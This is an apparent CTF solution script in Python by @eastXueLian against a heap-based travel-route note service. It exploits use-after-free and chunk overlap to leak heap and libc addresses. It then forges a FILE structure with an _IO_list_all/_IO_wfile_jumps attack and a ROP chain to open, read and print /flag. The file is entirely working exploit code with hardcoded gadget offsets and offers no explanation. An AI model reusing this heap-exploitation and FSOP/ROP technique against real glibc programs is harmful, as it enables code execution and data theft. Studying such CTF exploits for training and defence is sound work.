#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

# Available choices:
##  guangzhou
##  nanning
##  changsha
##  nanchang
##  fuzhou


def cmd(choice):
    ru(b"5. Calculate the distance.\n")
    sl(i2b(choice))


def add(transport, depart, dest, dist, data):
    cmd(1)
    ru(b"What kind of transportation do you want? car/train/plane?\n")
    sl(transport)
    ru(b"Please input the city name\n")
    sl(depart)
    ru(b"Please input the city name\n")
    sl(dest)
    ru(b"How far?\n")
    sl(i2b(dist))
    ru(b"Note:\n")
    s(data)


def delet(depart, dest):
    cmd(2)
    ru(b"Please input the city name\n")
    sl(depart)
    ru(b"Please input the city name\n")
    sl(dest)


def show(depart, dest):
    cmd(3)
    ru(b"Please input the city name\n")
    sl(depart)
    ru(b"Please input the city name\n")
    sl(dest)


add(b"car", b"guangzhou", b"guangzhou", 999, b"a")
add(b"car", b"guangzhou", b"nanning", 999, b"b")
add(b"plane", b"nanning", b"changsha", 999, b"c")
add(b"car", b"changsha", b"nanchang", 999, b"d")

cmd(5)
ru(b"Please input the city name\n")
sl(b"nanchang")

delet(b"guangzhou", b"guangzhou")
add(b"plane", b"nanchang", b"nanchang", 999, b"a")
add(b"car", b"guangzhou", b"guangzhou", 999, b"a")

show(b"guangzhou", b"guangzhou")
ru(b"Note:")
heap_base = (u64_ex(ru(b"\n", drop=True)) & 0xFFFFFFFFFFFFF000) - 0x1000
lg("heap_base", heap_base)

delet(b"nanning", b"changsha")
delet(b"guangzhou", b"nanning")

add(b"train", b"guangzhou", b"guangzhou", 999, b"a" * 0x510)
show(b"guangzhou", b"guangzhou")
ru(b"Note:" + b"a" * 0x510)
libc_base = u64_ex(ru(b"\n", drop=True)) - 0x21ACE0
lg("libc_base", libc_base)

add(b"train", b"guangzhou", b"guangzhou", 999, b"a")
add(b"car", b"nanning", b"nanning", 999, b"b")
add(b"plane", b"changsha", b"changsha", 999, b"c")
add(b"car", b"guangzhou", b"guangzhou", 999, b"d")

delet(b"nanning", b"nanning")
delet(b"changsha", b"changsha")
add(
    b"plane",
    b"nanning",
    b"nanning",
    999,
    flat({0x500: [0x520, 0x521, 0x1, 0x100000000003E7]}),
)

add(b"car", b"nanning", b"fuzhou", 999, b"d")

add(b"train", b"guangzhou", b"fuzhou", 999, b"d")
add(b"plane", b"guangzhou", b"guangzhou", 999, b"d")
add(b"plane", b"guangzhou", b"guangzhou", 999, b"d")

delet(b"guangzhou", b"fuzhou")
add(b"plane", b"guangzhou", b"guangzhou", 999, b"d")
delet(b"nanning", b"fuzhou")

cmd(4)
ru(b"Please input the city name\n")
sl(b"nanning")
ru(b"Please input the city name\n")
sl(b"guangzhou")
ru(b"Which one do you want to change?\n")
sl(b"0")
ru(b"How far?\n")
sl(b"10")
ru(b"Note:\n")

# 16a06a:>  48 8b 6f 48          >  mov    rbp,QWORD PTR [rdi+0x48]
# 16a06e:>  48 8b 45 18          >  mov    rax,QWORD PTR [rbp+0x18]
# 16a072:>  4c 8d 6d 10          >  lea    r13,[rbp+0x10]
# 16a076:>  c7 45 10 00 00 00 00 >  mov    DWORD PTR [rbp+0x10],0x0
# 16a07d:>  4c 89 ef             >  mov    rdi,r13
# 16a080:>  ff 50 28             >  call   QWORD PTR [rax+0x28]

magic_gadget = libc_base + 0x16A06A
leave_ret = libc_base + 0x000000000004DA83
add_rsp_0x38_ret = libc_base + 0x000000000005A44E
pop_rdi_ret = libc_base + 0x000000000002A3E5
pop_rsi_ret = libc_base + 0x000000000002BE51
pop_rdx_2_ret = libc_base + 0x000000000011F2E7

_IO_wfile_jumps = libc_base + libc.sym._IO_wfile_jumps
_lock = libc_base + 0x21CA70
fake_IO_FILE = heap_base + 0x3390

f1 = IO_FILE_plus_struct()
f1.flags = u64_ex("  sh;")
f1._IO_read_ptr = 0x521
f1._IO_read_end = libc_base + 0x21ACE0
f1._IO_read_base = libc_base + 0x21ACE0
f1._lock = _lock
f1._wide_data = fake_IO_FILE + 0xE0
f1.vtable = _IO_wfile_jumps

f1._IO_save_base = fake_IO_FILE + 0x520 + 0x100

payload = flat(
    {
        0: {
            0: bytes(f1),
            0xE0: {
                0x18: [0],
                0x30: [0],
                0xE0: [fake_IO_FILE + 0x200],
            },
            # 0x200: {0x68: [libc_base + libc.sym.system]},
            0x200: {0x68: [magic_gadget]},
        },
        0x520: {
            0: [0x520, 0x520, 0, 0x1000003E7],
            0x100: {
                0: [0xDEADBEEF, add_rsp_0x38_ret],
                0x18: [fake_IO_FILE + 0x520 + 0x100],
                0x28: [leave_ret],
                0x38: [
                    pop_rdi_ret,
                    fake_IO_FILE + 0xA48 + 0x200,
                    pop_rdi_ret,
                    fake_IO_FILE + 0xA48 + 0x200,
                    pop_rsi_ret,
                    0,
                    libc_base + libc.sym.open,
                    pop_rdi_ret,
                    3,
                    pop_rsi_ret,
                    fake_IO_FILE + 0xA48 + 0x100,
                    pop_rdx_2_ret,
                    0x100,
                    0,
                    libc_base + libc.sym.read,
                    pop_rdi_ret,
                    1,
                    libc_base + libc.sym.write,
                ],
            },
        },
        0xA48: {
            0: [
                0x531,
                libc_base + 0x21B110,
                libc_base + 0x21B110,
                heap_base + 0x3DD0,
                libc_base + libc.sym._IO_list_all - 0x20,
            ],
            0x200: b"/flag\x00",
        },
    }
)
s(payload)

debugB()
add(b"plane", b"guangzhou", b"guangzhou", 999, b"d")
cmd(9)

ia()

# 88423600807024982120743331231397
